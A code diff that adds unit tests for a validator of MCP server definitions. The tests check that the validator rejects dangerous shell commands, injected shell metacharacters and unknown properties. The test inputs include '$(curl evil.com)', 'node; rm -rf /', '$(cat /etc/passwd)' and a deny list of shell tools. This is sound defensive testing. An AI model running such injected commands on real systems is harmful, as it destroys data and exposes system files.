@@ -35,7 +35,7 @@ vi.mock('../fs-utils', () => ({
   }),
 }));
 
-import { injectClubhouseMcp, injectTemplateMcpServers, isClubhouseMcpEntry, stripClubhouseMcp, stripClubhouseMcpToml, buildClubhouseMcpDef } from './injection';
+import { injectClubhouseMcp, injectTemplateMcpServers, isClubhouseMcpEntry, stripClubhouseMcp, stripClubhouseMcpToml, buildClubhouseMcpDef, validateMcpServerDef } from './injection';
 
 describe('MCP Injection', () => {
   let tmpDir: string;
@@ -430,6 +430,103 @@ describe('MCP Injection', () => {
       const files = await fsp.readdir(tmpDir);
       const tmpFiles = files.filter(f => f.includes('.tmp.'));
       expect(tmpFiles).toHaveLength(0);
+    });
+
+    it('rejects dangerous commands like bash', async () => {
+      await expect(
+        injectTemplateMcpServers(tmpDir, {
+          'evil': { command: 'bash', args: ['-c', 'echo pwned'] },
+        }),
+      ).rejects.toThrow(/not allowed/);
+    });
+
+    it('rejects shell metacharacters in args', async () => {
+      await expect(
+        injectTemplateMcpServers(tmpDir, {
+          'evil': { command: 'node', args: ['$(curl evil.com)'] },
+        }),
+      ).rejects.toThrow(/shell metacharacters/);
+    });
+
+    it('rejects unknown properties in server definition', async () => {
+      await expect(
+        injectTemplateMcpServers(tmpDir, {
+          'evil': { command: 'node', malicious: true } as Record<string, unknown>,
+        }),
+      ).rejects.toThrow(/unknown property/);
+    });
+  });
+
+  describe('validateMcpServerDef', () => {
+    it('accepts valid server definition with command, args, env', () => {
+      expect(() =>
+        validateMcpServerDef('test', {
+          command: 'node',
+          args: ['server.js', '--port', '3000'],
+          env: { NODE_ENV: 'production' },
+        }),
+      ).not.toThrow();
+    });
+
+    it('accepts valid server definition with url and type', () => {
+      expect(() =>
+        validateMcpServerDef('test', {
+          type: 'sse',
+          url: 'http://localhost:3000',
+        }),
+      ).not.toThrow();
+    });
+
+    it('rejects null definition', () => {
+      expect(() => validateMcpServerDef('test', null)).toThrow(/must be a non-null object/);
+    });
+
+    it('rejects array definition', () => {
+      expect(() => validateMcpServerDef('test', [1, 2])).toThrow(/must be a non-null object/);
+    });
+
+    it('rejects dangerous shell commands', () => {
+      for (const cmd of ['bash', 'sh', 'cmd', 'powershell', 'curl', 'eval']) {
+        expect(() => validateMcpServerDef('test', { command: cmd })).toThrow(/not allowed/);
+      }
+    });
+
+    it('rejects dangerous commands in paths', () => {
+      expect(() => validateMcpServerDef('test', { command: '/usr/bin/bash' })).toThrow(/not allowed/);
+    });
+
+    it('rejects shell metacharacters in command', () => {
+      expect(() => validateMcpServerDef('test', { command: 'node; rm -rf /' })).toThrow(/shell metacharacters/);
+    });
+
+    it('rejects shell metacharacters in args', () => {
+      expect(() =>
+        validateMcpServerDef('test', { command: 'node', args: ['`whoami`'] }),
+      ).toThrow(/shell metacharacters/);
+    });
+
+    it('rejects backtick subshell in args', () => {
+      expect(() =>
+        validateMcpServerDef('test', { command: 'node', args: ['$(cat /etc/passwd)'] }),
+      ).toThrow(/shell metacharacters/);
+    });
+
+    it('rejects non-string args entries', () => {
+      expect(() =>
+        validateMcpServerDef('test', { command: 'node', args: [123] }),
+      ).toThrow(/must be a string/);
+    });
+
+    it('rejects non-string env values', () => {
+      expect(() =>
+        validateMcpServerDef('test', { command: 'node', env: { FOO: 123 } }),
+      ).toThrow(/must be a string/);
+    });
+
+    it('rejects unknown properties', () => {
+      expect(() =>
+        validateMcpServerDef('test', { command: 'node', shell: true }),
+      ).toThrow(/unknown property "shell"/);
     });
   });
 });
